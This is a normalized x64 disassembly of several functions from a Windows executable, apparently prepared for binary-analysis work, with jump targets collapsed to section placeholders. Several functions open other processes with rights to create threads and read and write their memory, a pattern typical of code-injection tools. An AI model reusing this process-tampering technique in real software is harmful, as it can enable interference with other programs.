mov [ rsp + 0xa8 ] rbx
movzx r14d dx
mov rbx rcx
xor edi edi
mov [ rsp + 0xb0 ] edi
mov [ rsp + 0x50 ] rcx
mov rax [ rcx ]
movsxd r8 [ rax + 0x4 ]
mov rcx [ r8 + rcx + 0x48 ]
test rcx rcx
je r-xdata
mov rax [ rbx ]
movsxd rcx [ rax + 0x4 ]
cmp [ rcx + rbx + 0x10 ] 0x0
jne r-xdata
mov rax [ rcx ]
call [ rax + 0x8 ]
nop
mov rcx [ rbx ]
movsxd rax [ rcx + 0x4 ]
cmp [ rax + rbx + 0x10 ] 0x0
sete al
mov [ rsp + 0x58 ] al
test al al
je r-xdata
mov rcx [ rcx + rbx + 0x50 ]
test rcx rcx
je r-xdata
mov rax [ rbx ]
movsxd rcx [ rax + 0x4 ]
add rcx rbx
test edi edi
je r-xdata
movsxd rcx [ rcx + 0x4 ]
add rcx rbx
lea rdx [ rsp + 0x30 ]
call sub_140003240
nop
mov rcx rax
call sub_14000b0c0
mov r13 rax
mov r12 [ rsp + 0x30 ]
test r12 r12
je r-xdata
call sub_1400103c0
call j_sub_14004042c
test al al
jne r-xdata
mov edx [ rcx + 0x10 ]
or edx edi
cmp [ rcx + 0x48 ] 0x0
jne r-xdata
mov rax [ rbx ]
movsxd r9 [ rax + 0x4 ]
add r9 rbx
mov rax [ r9 + 0x48 ]
mov [ rsp + 0x40 ] 0x0
mov [ rsp + 0x48 ] rax
movzx ecx [ r9 + 0x58 ]
movaps xmm0 [ rsp + 0x40 ]
movdqa [ rsp + 0x40 ] xmm0
mov r10 [ r13 ]
movzx eax r14w
mov [ rsp + 0x28 ] eax
mov [ rsp + 0x20 ] cx
lea r8 [ rsp + 0x40 ]
lea rdx [ rsp + 0x60 ]
mov rcx r13
call [ r10 + 0x30 ]
mov eax 0x4
cmp [ rsp + 0x60 ] 0x0
cmovne edi eax
mov [ rsp + 0xb0 ] edi
jmp r-xdata
xor edx edx
lea rcx [ rsp + 0xb8 ]
call sub_14003825c
mov rax [ r12 + 0x8 ]
test rax rax
je r-xdata
mov rax [ rbx ]
movsxd rcx [ rax + 0x4 ]
mov rcx [ rcx + rbx + 0x48 ]
test rcx rcx
je r-xdata
mov rcx rbx
call sub_1400112c0
nop
xor r8d r8d
call sub_140003120
nop
or edx 0x4
mov rsi rdi
cmp [ r12 + 0x8 ] rdi
cmove rsi r12
lea rcx [ rsp + 0xb8 ]
call sub_14003828c
test rsi rsi
je r-xdata
cmp rax 0xffffffffffffffff
jae r-xdata
mov rax rbx
mov rbx [ rsp + 0xa8 ]
add rsp 0x70
pop r14
pop r13
pop r12
pop rdi
pop rsi
retn
mov rax [ rcx ]
call [ rax + 0x10 ]
mov rax [ rsi ]
mov edx 0x1
mov rcx rsi
call [ rax ]
nop
dec rax
mov [ r12 + 0x8 ] rax
sub_14001c890
mov rax rsp
push rbp
lea rbp [ rax - 0x78 ]
sub rsp 0x170
mov [ rsp + 0x30 ] 0xfffffffffffffffe
mov [ rax + 0x10 ] rbx
mov [ rax + 0x18 ] rsi
mov [ rax + 0x20 ] rdi
mov rax [ rw-data ]
xor rax rsp
mov [ rbp + 0x60 ] rax
mov rbx rcx
mov [ rsp + 0x28 ] rcx
xor edi edi
mov [ rsp + 0x20 ] edi
mov [ rcx ] rdi
mov [ rcx + 0x8 ] rdi
mov [ rcx + 0x10 ] rdi
mov [ rsp + 0x20 ] 0x1
lea rax [ sub_14001d560 ]
mov [ rbp ] rax
mov esi 0x7
mov [ rbp + 0x20 ] rsi
mov [ rbp + 0x8 ] di
mov eax [ r--data ]
mov [ rbp + 0x8 ] eax
movzx eax [ r--data ]
mov [ rbp + 0xc ] ax
mov [ rbp + 0x18 ] 0x3
lea rax [ rbp + 0x8 ]
cmp rsi 0x8
cmovae rax [ rbp + 0x8 ]
mov [ rax + 0x6 ] di
mov [ rbp + 0x48 ] rsi
mov [ rbp + 0x40 ] rdi
mov [ rbp + 0x30 ] di
xor r8d r8d
lea edx [ rdi + 0x2f ]
lea rcx [ rbp + 0x30 ]
call sub_1400025a0
lea rcx [ rbp + 0x30 ]
cmp [ rbp + 0x48 ] 0x8
cmovae rcx [ rbp + 0x30 ]
lea r8d [ rdi + 0x5e ]
lea rdx [ r--data ]
call sub_14003a8c0
mov [ rbp + 0x40 ] 0x2f
lea rax [ rbp + 0x30 ]
cmp [ rbp + 0x48 ] 0x8
cmovae rax [ rbp + 0x30 ]
mov [ rax + 0x5e ] di
lea rdx [ rbp ]
mov rcx rbx
call sub_140018d50
lea r11 [ sub_14001cbb0 ]
mov [ rbp - 0x60 ] r11
mov [ rbp - 0x40 ] rsi
mov [ rbp - 0x58 ] di
mov rcx [ r--data ]
mov [ rbp - 0x58 ] rcx
mov eax [ r--data ]
mov [ rbp - 0x50 ] eax
movzx eax [ r--data ]
mov [ rbp - 0x4c ] ax
mov [ rbp - 0x48 ] rsi
lea rax [ rbp - 0x58 ]
cmp rsi 0x8
cmovae rax rcx
mov [ rax + 0xe ] di
mov [ rbp - 0x18 ] rsi
mov [ rbp - 0x20 ] rdi
mov [ rbp - 0x30 ] di
xor r8d r8d
lea edx [ rdi + 0x35 ]
lea rcx [ rbp - 0x30 ]
call sub_1400025a0
lea rcx [ rbp - 0x30 ]
cmp [ rbp - 0x18 ] 0x8
cmovae rcx [ rbp - 0x30 ]
lea r8d [ rdi + 0x6a ]
lea rdx [ r--data ]
call sub_14003a8c0
mov [ rbp - 0x20 ] 0x35
lea rax [ rbp - 0x30 ]
cmp [ rbp - 0x18 ] 0x8
cmovae rax [ rbp - 0x30 ]
mov [ rax + 0x6a ] di
lea rdx [ rbp - 0x60 ]
mov rcx rbx
call sub_140018d50
lea r11 [ sub_14001d0b0 ]
mov [ rsp + 0x40 ] r11
mov [ rsp + 0x60 ] rsi
mov [ rsp + 0x48 ] di
mov rcx [ r--data ]
mov [ rsp + 0x48 ] rcx
mov eax [ r--data ]
mov [ rsp + 0x50 ] eax
movzx eax [ r--data ]
mov [ rsp + 0x54 ] ax
mov [ rsp + 0x58 ] rsi
lea rax [ rsp + 0x48 ]
cmp rsi 0x8
cmovae rax rcx
mov [ rax + 0xe ] di
mov [ rbp - 0x78 ] rsi
mov [ rbp - 0x80 ] rdi
mov [ rsp + 0x70 ] di
xor r8d r8d
lea edx [ rdi + 0x33 ]
lea rcx [ rsp + 0x70 ]
call sub_1400025a0
lea rcx [ rsp + 0x70 ]
cmp [ rbp - 0x78 ] 0x8
cmovae rcx [ rsp + 0x70 ]
lea r8d [ rdi + 0x66 ]
lea rdx [ r--data ]
call sub_14003a8c0
mov [ rbp - 0x80 ] 0x33
lea rax [ rsp + 0x70 ]
cmp [ rbp - 0x78 ] 0x8
cmovae rax [ rsp + 0x70 ]
mov [ rax + 0x66 ] di
lea rdx [ rsp + 0x40 ]
mov rcx rbx
call sub_140018d50
nop
cmp [ rbp - 0x78 ] 0x8
jb r-xdata
mov [ rbp - 0x78 ] rsi
mov [ rbp - 0x80 ] rdi
mov [ rsp + 0x70 ] di
cmp [ rsp + 0x60 ] 0x8
jb r-xdata
mov rcx [ rsp + 0x70 ]
call j_sub_14003ad04
mov [ rsp + 0x60 ] rsi
mov [ rsp + 0x58 ] rdi
mov [ rsp + 0x48 ] di
cmp [ rbp - 0x18 ] 0x8
jb r-xdata
mov rcx [ rsp + 0x48 ]
call j_sub_14003ad04
mov [ rbp - 0x18 ] rsi
mov [ rbp - 0x20 ] rdi
mov [ rbp - 0x30 ] di
cmp [ rbp - 0x40 ] 0x8
jb r-xdata
mov rcx [ rbp - 0x30 ]
call j_sub_14003ad04
mov [ rbp - 0x40 ] rsi
mov [ rbp - 0x48 ] rdi
mov [ rbp - 0x58 ] di
cmp [ rbp + 0x48 ] 0x8
jb r-xdata
mov rcx [ rbp - 0x58 ]
call j_sub_14003ad04
mov [ rbp + 0x48 ] rsi
mov [ rbp + 0x40 ] rdi
mov [ rbp + 0x30 ] di
cmp [ rbp + 0x20 ] 0x8
jb r-xdata
mov rcx [ rbp + 0x30 ]
call j_sub_14003ad04
mov rax rbx
mov rcx [ rbp + 0x60 ]
xor rcx rsp
call sub_14003a6a0
lea r11 [ rsp + 0x170 ]
mov rbx [ r11 + 0x18 ]
mov rsi [ r11 + 0x20 ]
mov rdi [ r11 + 0x28 ]
mov rsp r11
pop rbp
retn
mov rcx [ rbp + 0x8 ]
call j_sub_14003ad04
sub_14001cbb0
mov rax rsp
push rbp
lea rbp [ rax - 0x78 ]
sub rsp 0x170
mov [ rsp + 0x58 ] 0xfffffffffffffffe
mov [ rax + 0x10 ] rbx
mov [ rax + 0x18 ] rsi
mov [ rax + 0x20 ] rdi
mov rax [ rw-data ]
xor rax rsp
mov [ rbp + 0x60 ] rax
mov rbx rcx
mov [ rbp + 0x28 ] 0x7
xor esi esi
mov [ rbp + 0x20 ] rsi
mov [ rbp + 0x10 ] si
or r9 0xffffffffffffffff
xor r8d r8d
mov rdx [ rcx ]
lea rcx [ rbp + 0x10 ]
call sub_140001dd0
nop
mov rdx [ rbx + 0x8 ]
add rdx 0xffffffffffffffd8
mov [ rbp ] 0x7
mov [ rbp - 0x8 ] rsi
mov [ rbp - 0x18 ] si
or r9 0xffffffffffffffff
xor r8d r8d
lea rcx [ rbp - 0x18 ]
call sub_140001dd0
nop
mov [ rbp - 0x58 ] 0x7
mov [ rbp - 0x60 ] rsi
mov [ rbp - 0x70 ] si
xor dil dil
lea ecx [ rsi + 0x20 ]
call sub_14003ac60
mov rbx rax
test rax rax
je r-xdata
mov rbx rsi
mov [ rax ] rsi
mov [ rax + 0x8 ] rsi
mov [ rax + 0x10 ] rsi
jmp r-xdata
test rbx rbx
je r-xdata
mov r8 [ rbx ]
mov rcx [ rbx + 0x8 ]
sub rcx r8
mov rax 0x2e8ba2e8ba2e8ba3
imul rcx
sar rdx 0x4
mov rax rdx
shr rax 0x3f
add rdx rax
cmp rdx 0x1
sete dil
test dil dil
je r-xdata
lea rdx [ rbp + 0x10 ]
mov rcx rbx
call sub_14000c0b0
test al al
je r-xdata
test dil dil
je r-xdata
mov rcx rbx
call sub_14000d510
mov rcx rbx
call j_sub_14003ad04
mov eax [ r8 ]
mov [ rsp + 0x60 ] eax
mov eax [ r8 + 0x4 ]
mov [ rsp + 0x64 ] eax
mov eax [ r8 + 0x8 ]
mov [ rsp + 0x68 ] eax
mov rax [ r8 + 0x10 ]
mov [ rsp + 0x70 ] rax
mov eax [ r8 + 0x18 ]
mov [ rsp + 0x78 ] eax
mov eax [ r8 + 0x1c ]
mov [ rsp + 0x7c ] eax
mov eax [ r8 + 0x20 ]
mov [ rbp - 0x80 ] eax
mov eax [ r8 + 0x24 ]
mov [ rbp - 0x7c ] eax
mov eax [ r8 + 0x28 ]
mov [ rbp - 0x78 ] eax
lea rdx [ r8 + 0x30 ]
or r9 0xffffffffffffffff
xor r8d r8d
lea rcx [ rbp - 0x70 ]
call sub_140001dd0
xor r8d r8d
mov dl 0x1
lea rcx [ rbp - 0x40 ]
call sub_14000f390
mov rbx rax
lea rdx [ r--data ]
lea rcx [ rw-data ]
call sub_14000ac10
mov rcx rax
lea rdx [ rbp + 0x10 ]
call sub_14000ae70
mov rcx rax
lea rdx [ r--data ]
call sub_14000ac10
mov rcx rax
mov rdx rbx
call sub_14000ae70
mov rcx rax
call sub_140007970
nop
lea rdx [ r--data ]
lea rcx [ rw-data ]
call sub_14000ac10
mov rcx rax
lea rdx [ rbp + 0x10 ]
call sub_14000ae70
mov rcx rax
lea rdx [ r--data ]
call sub_14000ac10
mov rcx rax
mov edx [ rsp + 0x68 ]
call sub_140008400
mov rcx rax
call sub_140007970
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rbp - 0x58 ] 0x8
jb r-xdata
mov rcx [ rbp - 0x40 ]
mov r8d [ rsp + 0x68 ]
xor edx edx
mov ecx 0x43a
call [ OpenProcess@IAT ]
mov [ rsp + 0x20 ] rax
test rax rax
je r-xdata
lea rdx [ r--data ]
lea rcx [ rw-data ]
call sub_14000ac10
mov rcx rax
call sub_140007970
jmp r-xdata
mov [ rbp - 0x58 ] 0x7
mov [ rbp - 0x60 ] rsi
mov [ rbp - 0x70 ] si
cmp [ rbp ] 0x8
jb r-xdata
mov rcx [ rbp - 0x70 ]
call j_sub_14003ad04
xor r8d r8d
mov dl 0x1
lea rcx [ rbp - 0x40 ]
call sub_14000f390
mov rbx rax
lea rdx [ r--data ]
lea rcx [ rw-data ]
call sub_14000ac10
mov rcx rax
mov rdx rbx
call sub_14000ae70
mov rcx rax
call sub_140007970
nop
jmp r-xdata
lea rdx [ rbp - 0x18 ]
lea rcx [ rsp + 0x20 ]
call sub_140006570
movzx ebx al
mov rcx [ rsp + 0x20 ]
call [ CloseHandle@IAT ]
test bl bl
je r-xdata
mov [ rbp ] 0x7
mov [ rbp - 0x8 ] rsi
mov [ rbp - 0x18 ] si
cmp [ rbp + 0x28 ] 0x8
jb r-xdata
mov rcx [ rbp - 0x18 ]
call j_sub_14003ad04
cmp [ rbp - 0x28 ] 0x8
jb r-xdata
mov [ rbp + 0x50 ] 0x7
mov [ rbp + 0x48 ] rsi
mov [ rbp + 0x38 ] si
mov ecx 0x38
call sub_14003ac60
mov rbx rax
mov [ rsp + 0x20 ] rax
test rax rax
je r-xdata
mov al 0x1
mov rcx [ rbp + 0x60 ]
xor rcx rsp
call sub_14003a6a0
lea r11 [ rsp + 0x170 ]
mov rbx [ r11 + 0x18 ]
mov rsi [ r11 + 0x20 ]
mov rdi [ r11 + 0x28 ]
mov rsp r11
pop rbp
retn
mov rcx [ rbp + 0x10 ]
call j_sub_14003ad04
mov rax rsi
lea rax [ rsp + 0x28 ]
mov [ rsp + 0x50 ] rax
mov [ rsp + 0x40 ] 0x7
mov [ rsp + 0x38 ] rsi
mov [ rsp + 0x28 ] si
mov r8d 0x1
lea rdx [ r--data ]
lea rcx [ rsp + 0x28 ]
call sub_140001ea0
nop
mov [ rbp - 0x28 ] 0x7
mov [ rbp - 0x30 ] rsi
mov [ rbp - 0x40 ] si
mov r8d 0xd
lea rdx [ r--data ]
lea rcx [ rbp - 0x40 ]
call sub_140001ea0
nop
lea r8 [ rsp + 0x28 ]
lea rdx [ rbp - 0x40 ]
mov rcx rbx
call sub_14000b810
jmp r-xdata
xor r8d r8d
mov dl 0x1
lea rcx [ rbp - 0x40 ]
call sub_14000f390
mov rbx rax
lea rdx [ r--data ]
lea rcx [ rw-data ]
call sub_14000ac10
mov rcx rax
mov rdx rbx
call sub_14000ae70
mov rcx rax
call sub_140007970
nop
lea rdx [ r--data ]
lea rcx [ rw-data ]
call sub_14000ac10
mov rcx rax
call sub_140007970
lea rcx [ rbp + 0x38 ]
call sub_14000b9a0
test al al
je r-xdata
mov [ rw-data ] rax
lea rdx [ r--data ]
lea rcx [ rw-data ]
call sub_14000ac10
mov rcx rax
call sub_140007970
call sub_14000ba70
test al al
je r-xdata
call sub_14001da30
nop
mov rcx [ rbp - 0x40 ]
call j_sub_14003ad04
xor r8d r8d
mov dl 0x1
lea rcx [ rbp - 0x40 ]
call sub_14000f390
mov rbx rax
lea rdx [ r--data ]
lea rcx [ rw-data ]
call sub_14000ac10
mov rcx rax
mov rdx rbx
call sub_14000ae70
mov rcx rax
call sub_140007970
nop
jmp r-xdata
lea rdx [ r--data ]
lea rcx [ rw-data ]
call sub_14000ac10
mov rcx rax
call sub_140007970
lea rdx [ rbp + 0x38 ]
mov rcx rax
call sub_14000ae70
mov rcx rax
call sub_140007970
jmp r-xdata
mov rcx [ rbp + 0x38 ]
jmp r-xdata
cmp [ rbp - 0x28 ] 0x8
jb r-xdata
cmp [ rbp + 0x50 ] 0x8
jb r-xdata
call j_sub_14003ad04
nop
sub_14001d0b0
mov rax rsp
push rbp
lea rbp [ rax - 0x98 ]
sub rsp 0x190
mov [ rsp + 0x58 ] 0xfffffffffffffffe
mov [ rax + 0x10 ] rbx
mov [ rax + 0x18 ] rdi
mov rax [ rw-data ]
xor rax rsp
mov [ rbp + 0x80 ] rax
mov rbx rcx
mov [ rbp + 0x20 ] 0x7
xor edi edi
mov [ rbp + 0x18 ] rdi
mov [ rbp + 0x8 ] di
or r9 0xffffffffffffffff
xor r8d r8d
mov rdx [ rcx ]
lea rcx [ rbp + 0x8 ]
call sub_140001dd0
nop
mov rdx [ rbx + 0x8 ]
add rdx 0xffffffffffffffd8
mov [ rbp + 0x48 ] 0x7
mov [ rbp + 0x40 ] rdi
mov [ rbp + 0x30 ] di
or r9 0xffffffffffffffff
xor r8d r8d
lea rcx [ rbp + 0x30 ]
call sub_140001dd0
nop
mov [ rsp + 0x78 ] 0x7
mov [ rsp + 0x70 ] rdi
mov [ rsp + 0x60 ] di
mov [ rbp - 0x60 ] 0x7
mov [ rbp - 0x68 ] rdi
mov [ rbp - 0x78 ] di
lea rdx [ rbp + 0x8 ]
lea rcx [ rsp + 0x60 ]
call sub_14000eb30
test al al
je r-xdata
xor r8d r8d
mov dl 0x1
lea rcx [ rbp - 0x20 ]
call sub_14000f390
mov rbx rax
lea rdx [ r--data ]
lea rcx [ rw-data ]
call sub_14000ac10
mov rcx rax
lea rdx [ rbp + 0x8 ]
call sub_14000ae70
mov rcx rax
lea rdx [ r--data ]
call sub_14000ac10
mov rcx rax
mov rdx rbx
call sub_14000ae70
mov rcx rax
call sub_140007970
nop
lea rdx [ r--data ]
lea rcx [ rw-data ]
call sub_14000ac10
mov rcx rax
lea rdx [ rbp + 0x8 ]
call sub_14000ae70
mov rcx rax
lea rdx [ r--data ]
call sub_14000ac10
mov rcx rax
lea rdx [ rbp - 0x78 ]
call sub_14000ae70
mov rcx rax
call sub_140007970
lea rdx [ r--data ]
lea rcx [ rw-data ]
call sub_14000ac10
mov rcx rax
lea rdx [ rbp + 0x8 ]
call sub_14000ae70
mov rcx rax
lea rdx [ r--data ]
call sub_14000ac10
mov rcx rax
mov edx [ rbp - 0x34 ]
call sub_140008400
mov rcx rax
call sub_140007970
cmp [ rw-data ] rdi
je r-xdata
cmp [ rbp - 0x60 ] 0x8
jb r-xdata
mov rcx [ rbp - 0x20 ]
mov r8d [ rbp - 0x34 ]
xor edx edx
mov ecx 0x43a
call [ OpenProcess@IAT ]
mov [ rsp + 0x20 ] rax
test rax rax
je r-xdata
lea rdx [ r--data ]
lea rcx [ rw-data ]
call sub_14000ac10
mov rcx rax
call sub_140007970
jmp r-xdata
mov [ rbp - 0x60 ] 0x7
mov [ rbp - 0x68 ] rdi
mov [ rbp - 0x78 ] di
cmp [ rsp + 0x78 ] 0x8
jb r-xdata
mov rcx [ rbp - 0x78 ]
call j_sub_14003ad04
xor r8d r8d
mov dl 0x1
lea rcx [ rbp - 0x20 ]
call sub_14000f390
mov rbx rax
lea rdx [ r--data ]
lea rcx [ rw-data ]
call sub_14000ac10
mov rcx rax
mov rdx rbx
call sub_14000ae70
mov rcx rax
call sub_140007970
nop
jmp r-xdata
lea rdx [ rbp + 0x30 ]
lea rcx [ rsp + 0x20 ]
call sub_140006570
movzx ebx al
mov rcx [ rsp + 0x20 ]
call [ CloseHandle@IAT ]
test bl bl
je r-xdata
mov [ rsp + 0x78 ] 0x7
mov [ rsp + 0x70 ] rdi
mov [ rsp + 0x60 ] di
cmp [ rbp + 0x48 ] 0x8
jb r-xdata
mov rcx [ rsp + 0x60 ]
call j_sub_14003ad04
cmp [ rbp - 0x8 ] 0x8
jb r-xdata
mov [ rbp + 0x70 ] 0x7
mov [ rbp + 0x68 ] rdi
mov [ rbp + 0x58 ] di
mov ecx 0x38
call sub_14003ac60
mov rbx rax
mov [ rsp + 0x20 ] rax
test rax rax
je r-xdata
mov [ rbp + 0x48 ] 0x7
mov [ rbp + 0x40 ] rdi
mov [ rbp + 0x30 ] di
cmp [ rbp + 0x20 ] 0x8
jb r-xdata
mov rcx [ rbp + 0x30 ]
call j_sub_14003ad04
mov rax rdi
lea rax [ rsp + 0x28 ]
mov [ rsp + 0x50 ] rax
mov [ rsp + 0x40 ] 0x7
mov [ rsp + 0x38 ] rdi
mov [ rsp + 0x28 ] di
mov r8d 0x1
lea rdx [ r--data ]
lea rcx [ rsp + 0x28 ]
call sub_140001ea0
nop
mov [ rbp - 0x8 ] 0x7
mov [ rbp - 0x10 ] rdi
mov [ rbp - 0x20 ] di
mov r8d 0xd
lea rdx [ r--data ]
lea rcx [ rbp - 0x20 ]
call sub_140001ea0
nop
lea r8 [ rsp + 0x28 ]
lea rdx [ rbp - 0x20 ]
mov rcx rbx
call sub_14000b810
jmp r-xdata
mov al 0x1
mov rcx [ rbp + 0x80 ]
xor rcx rsp
call sub_14003a6a0
lea r11 [ rsp + 0x190 ]
mov rbx [ r11 + 0x18 ]
mov rdi [ r11 + 0x20 ]
mov rsp r11
pop rbp
retn
mov rcx [ rbp + 0x8 ]
call j_sub_14003ad04
xor r8d r8d
mov dl 0x1
lea rcx [ rbp - 0x20 ]
call sub_14000f390
mov rbx rax
lea rdx [ r--data ]
lea rcx [ rw-data ]
call sub_14000ac10
mov rcx rax
mov rdx rbx
call sub_14000ae70
mov rcx rax
call sub_140007970
nop
lea rdx [ r--data ]
lea rcx [ rw-data ]
call sub_14000ac10
mov rcx rax
call sub_140007970
lea rcx [ rbp + 0x58 ]
call sub_14000b9a0
test al al
je r-xdata
mov [ rw-data ] rax
lea rdx [ r--data ]
lea rcx [ rw-data ]
call sub_14000ac10
mov rcx rax
call sub_140007970
call sub_14000ba70
test al al
je r-xdata
call sub_14001da30
nop
mov rcx [ rbp - 0x20 ]
call j_sub_14003ad04
xor r8d r8d
mov dl 0x1
lea rcx [ rbp - 0x20 ]
call sub_14000f390
mov rbx rax
lea rdx [ r--data ]
lea rcx [ rw-data ]
call sub_14000ac10
mov rcx rax
mov rdx rbx
call sub_14000ae70
mov rcx rax
call sub_140007970
nop
jmp r-xdata
lea rdx [ r--data ]
lea rcx [ rw-data ]
call sub_14000ac10
mov rcx rax
call sub_140007970
lea rdx [ rbp + 0x58 ]
mov rcx rax
call sub_14000ae70
mov rcx rax
call sub_140007970
jmp r-xdata
mov rcx [ rbp + 0x58 ]
jmp r-xdata
cmp [ rbp - 0x8 ] 0x8
jb r-xdata
cmp [ rbp + 0x70 ] 0x8
jb r-xdata
call j_sub_14003ad04
nop
sub_14001d560
mov rax rsp
push rbp
lea rbp [ rax - 0xa8 ]
sub rsp 0x1a0
mov [ rsp + 0x30 ] 0xfffffffffffffffe
mov [ rax + 0x10 ] rbx
mov [ rax + 0x18 ] rdi
mov rax [ rw-data ]
xor rax rsp
mov [ rbp + 0x90 ] rax
mov rbx rcx
xor edi edi
mov [ rsp + 0x20 ] edi
mov [ rbp + 0x80 ] 0x7
mov [ rbp + 0x78 ] rdi
mov [ rbp + 0x68 ] di
or r9 0xffffffffffffffff
xor r8d r8d
mov rdx [ rcx ]
lea rcx [ rbp + 0x68 ]
call sub_140001dd0
nop
mov rdx [ rbx + 0x8 ]
add rdx 0xffffffffffffffd8
mov [ rbp + 0x58 ] 0x7
mov [ rbp + 0x50 ] rdi
mov [ rbp + 0x40 ] di
or r9 0xffffffffffffffff
xor r8d r8d
lea rcx [ rbp + 0x40 ]
call sub_140001dd0
nop
lea rax [ r--data ]
mov [ rsp + 0x40 ] rax
lea rax [ r--data ]
mov [ rsp + 0x50 ] rax
lea rax [ r--data ]
mov [ rbp - 0x28 ] rax
mov [ rsp + 0x20 ] 0x1
lea rdx [ rsp + 0x58 ]
lea rcx [ rsp + 0x40 ]
call sub_140004740
nop
mov rax [ rsp + 0x40 ]
movsxd rcx [ rax + 0x4 ]
lea rax [ r--data ]
mov [ rsp + rcx + 0x40 ] rax
lea rax [ rsp + 0x58 ]
mov [ rsp + 0x28 ] rax
lea rcx [ rsp + 0x58 ]
call sub_140004aa0
nop
lea rax [ r--data ]
mov [ rsp + 0x58 ] rax
lea rdx [ rbp + 0x68 ]
cmp [ rbp + 0x80 ] 0x8
cmovae rdx [ rbp + 0x68 ]
mov [ rbp - 0x38 ] rdi
mov [ rbp - 0x30 ] edi
mov r8 [ rbp + 0x78 ]
test r8 r8
je r-xdata
lea rdx [ rsp + 0x24 ]
lea rcx [ rsp + 0x40 ]
call sub_14001da90
mov rcx [ rbx + 0x8 ]
sub rcx [ rbx ]
mov rax 0x6666666666666667
imul rcx
sar rdx 0x4
mov rax rdx
shr rax 0x3f
add rdx rax
cmp rdx 0x3
setb r8b
lea rdx [ rbp + 0x40 ]
lea rcx [ rsp + 0x24 ]
call sub_14001d750
nop
lea rcx [ rbp - 0x28 ]
call sub_140003cd0
lea r11 [ r--data ]
mov [ rbp - 0x28 ] r11
lea rcx [ rbp - 0x28 ]
call sub_140037d08
nop
cmp [ rbp + 0x58 ] 0x8
jb r-xdata
lea rcx [ rsp + 0x58 ]
call sub_140004b90
nop
mov [ rbp + 0x58 ] 0x7
mov [ rbp + 0x50 ] rdi
mov [ rbp + 0x40 ] di
cmp [ rbp + 0x80 ] 0x8
jb r-xdata
mov rcx [ rbp + 0x40 ]
call j_sub_14003ad04
mov al 0x1
mov rcx [ rbp + 0x90 ]
xor rcx rsp
call sub_14003a6a0
lea r11 [ rsp + 0x1a0 ]
mov rbx [ r11 + 0x18 ]
mov rdi [ r11 + 0x20 ]
mov rsp r11
pop rbp
retn
mov rcx [ rbp + 0x68 ]
call j_sub_14003ad04
sub_14001d750
push rbp
push rsi
push rdi
lea rbp [ rsp - 0x47 ]
sub rsp 0xc0
mov [ rbp - 0x21 ] 0xfffffffffffffffe
mov [ rsp + 0xf0 ] rbx
mov rax [ rw-data ]
xor rax rsp
mov [ rbp + 0x37 ] rax
movzx ebx r8b
mov rsi rdx
test r8b r8b
je r-xdata
xor dil dil
mov r8d [ rcx ]
xor edx edx
mov ecx 0x43a
call [ OpenProcess@IAT ]
mov [ rbp - 0x59 ] rax
test rax rax
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
test dil dil
je r-xdata
mov rdx rsi
lea rcx [ rbp - 0x59 ]
call sub_140006570
movzx edi al
mov rcx [ rbp - 0x59 ]
call [ CloseHandle@IAT ]
lea rdx [ r--data ]
lea rcx [ rw-data ]
call sub_14000ac10
mov rcx rax
call sub_140007970
xor al al
jmp r-xdata
xor r8d r8d
mov dl 0x1
lea rcx [ rbp - 0x19 ]
call sub_14000f390
mov rbx rax
lea rdx [ r--data ]
lea rcx [ rw-data ]
call sub_14000ac10
mov rcx rax
mov rdx rbx
call sub_14000ae70
mov rcx rax
call sub_140007970
nop
cmp [ rbp - 0x1 ] 0x8
jb r-xdata
test bl bl
je r-xdata
mov rcx [ rbp + 0x37 ]
xor rcx rsp
call sub_14003a6a0
mov rbx [ rsp + 0xf0 ]
add rsp 0xc0
pop rdi
pop rsi
pop rbp
retn
movzx eax dil
mov rcx [ rbp - 0x19 ]
lea rdx [ r--data ]
lea rcx [ rw-data ]
call sub_14000ac10
mov rcx rax
call sub_140007970
jmp r-xdata
mov [ rbp + 0x27 ] 0x7
xor ebx ebx
mov [ rbp + 0x1f ] rbx
mov [ rbp + 0xf ] bx
lea ecx [ rbx + 0x38 ]
call sub_14003ac60
mov rsi rax
mov [ rbp - 0x59 ] rax
test rax rax
je r-xdata
mov [ rw-data ] rbx
lea rdx [ r--data ]
lea rcx [ rw-data ]
call sub_14000ac10
mov rcx rax
call sub_140007970
call sub_14000ba70
test al al
je r-xdata
lea rax [ rbp - 0x51 ]
mov [ rbp - 0x29 ] rax
mov [ rbp - 0x39 ] 0x7
mov [ rbp - 0x41 ] rbx
mov [ rbp - 0x51 ] bx
lea r8d [ rbx + 0x1 ]
lea rdx [ r--data ]
lea rcx [ rbp - 0x51 ]
call sub_140001ea0
nop
mov [ rbp - 0x1 ] 0x7
mov [ rbp - 0x9 ] rbx
mov [ rbp - 0x19 ] bx
lea r8d [ rbx + 0xd ]
lea rdx [ r--data ]
lea rcx [ rbp - 0x19 ]
call sub_140001ea0
nop
lea r8 [ rbp - 0x51 ]
lea rdx [ rbp - 0x19 ]
mov rcx rsi
call sub_14000b810
mov rbx rax
xor r8d r8d
mov dl 0x1
lea rcx [ rbp - 0x19 ]
call sub_14000f390
mov rbx rax
lea rdx [ r--data ]
lea rcx [ rw-data ]
call sub_14000ac10
mov rcx rax
mov rdx rbx
call sub_14000ae70
mov rcx rax
call sub_140007970
nop
lea rdx [ r--data ]
lea rcx [ rw-data ]
call sub_14000ac10
mov rcx rax
call sub_140007970
lea rcx [ rbp + 0xf ]
call sub_14000b9a0
test al al
je r-xdata
call sub_14001da30
nop
mov rcx [ rbp - 0x19 ]
call j_sub_14003ad04
xor r8d r8d
mov dl 0x1
lea rcx [ rbp - 0x19 ]
call sub_14000f390
mov rbx rax
lea rdx [ r--data ]
lea rcx [ rw-data ]
call sub_14000ac10
mov rcx rax
mov rdx rbx
call sub_14000ae70
mov rcx rax
call sub_140007970
nop
jmp r-xdata
lea rdx [ r--data ]
lea rcx [ rw-data ]
call sub_14000ac10
mov rcx rax
call sub_140007970
lea rdx [ rbp + 0xf ]
mov rcx rax
call sub_14000ae70
mov rcx rax
call sub_140007970
jmp r-xdata
mov rcx [ rbp + 0xf ]
jmp r-xdata
cmp [ rbp - 0x1 ] 0x8
jb r-xdata
cmp [ rbp + 0x27 ] 0x8
jb r-xdata
call j_sub_14003ad04
sub_14001da30
sub rsp 0x28
cmp [ rw-data ] 0x0
je r-xdata
mov al 0x1
add rsp 0x28
retn
lea rdx [ r--data ]
lea rcx [ rw-data ]
call sub_14000ac10
mov rcx rax
call sub_140007970
mov rcx [ rw-data ]
test rcx rcx
je r-xdata
mov [ rw-data ] 0x0
mov rax [ rcx ]
mov edx 0x1
call [ rax ]
sub_14001da90
mov [ rsp + 0x8 ] rcx
push rbx
push rsi
push rdi
push r12
push r13
sub rsp 0x90
